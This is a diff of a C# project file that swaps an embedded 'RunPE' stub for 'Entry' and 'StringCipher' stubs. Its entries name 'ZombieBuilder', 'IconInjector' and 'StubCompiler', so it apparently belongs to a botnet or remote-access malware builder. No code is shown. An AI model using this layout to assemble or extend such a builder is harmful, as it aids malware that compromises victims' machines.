@@ -107,8 +107,10 @@
     <Compile Include="Functions\Screenshot.cs" />
     <Compile Include="Helper\ComboboxItem.cs" />
     <Compile Include="Helper\IconInjector.cs" />
+    <Compile Include="Helper\StringCipher.cs" />
     <Compile Include="Helper\ZombieBuilder.cs" />
-    <EmbeddedResource Include="Stub\RunPE.cs" />
+    <EmbeddedResource Include="Stub\StringCipher.cs" />
+    <EmbeddedResource Include="Stub\Entry.cs" />
     <Compile Include="Stub\StubCompiler.cs" />
     <Compile Include="Web\Server.cs" />
     <Compile Include="Web\StateObject.cs" />
